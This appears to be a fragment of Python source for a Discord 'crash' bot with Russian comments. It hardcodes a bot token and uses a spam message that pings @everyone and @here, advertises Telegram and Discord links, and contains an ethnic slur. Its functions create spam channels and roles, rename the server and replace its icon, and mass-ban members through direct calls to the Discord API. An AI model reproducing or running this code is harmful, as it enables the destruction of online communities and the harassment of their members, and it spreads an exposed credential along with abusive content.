...
token = 'MTA0NjUwNTcyNjY4MTU0Njc2Mw.G8m1uk.ZeH4ATTRcgVaxQ-_I1My1FqCGog4vrCbdNSph0' # токен бота
spamtext = '||@everyone @here||\nhttps://t.me/murderspell\nhttps://discord.gg/REDdKVt5Fx\nЧУРКА НА ДАМИРЕ А ЭТО ПОДАРОК ОТ MISFITSCAM' # текст спама при краше
...
async def createchannel(ctx):
    try: c = await ctx.guild.create_text_channel('by-murderspell')
    except: pass
    else: create_task(sendch(ch=c,text=spamtext,count=5))

async def createrole(ctx):
    try: await ctx.guild.create_role(name='by murderspell')
    except: pass
...
async def rename(ctx):
    ...
    with open('icon.PNG', 'rb') as f:
        icon = f.read()
        await ctx.guild.edit(name='misfitscam', icon=icon)
...
async def banus(ctx, limit=None):
    ...
    for member in memlist:
        if member.roles[-1].position >= ctx.guild.me.roles[-1].position:
            continue
        guild = ctx.guild
        put(f'https://discord.com/api/guilds/{guild.id}/bans/{member.id}', headers={'Authorization': 'Bot ' + token, 'X-Audit-Log-Reason': 'МАНСУР СПАСИБО '}, json={'delete_message_days': 1})
